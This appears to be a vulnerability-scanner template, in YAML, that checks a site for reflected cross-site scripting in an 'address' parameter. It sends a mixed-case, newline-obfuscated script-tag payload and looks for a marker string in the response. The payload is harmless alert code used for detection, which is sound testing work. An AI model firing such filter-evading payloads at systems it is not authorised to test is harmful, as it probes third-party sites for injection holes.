id: xss5-2940
name: 'Raw XSS5 in address'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in address'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      address:
        - '<ScRiPt%0a>alert(nx52939)</ScRiPt>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx52939'
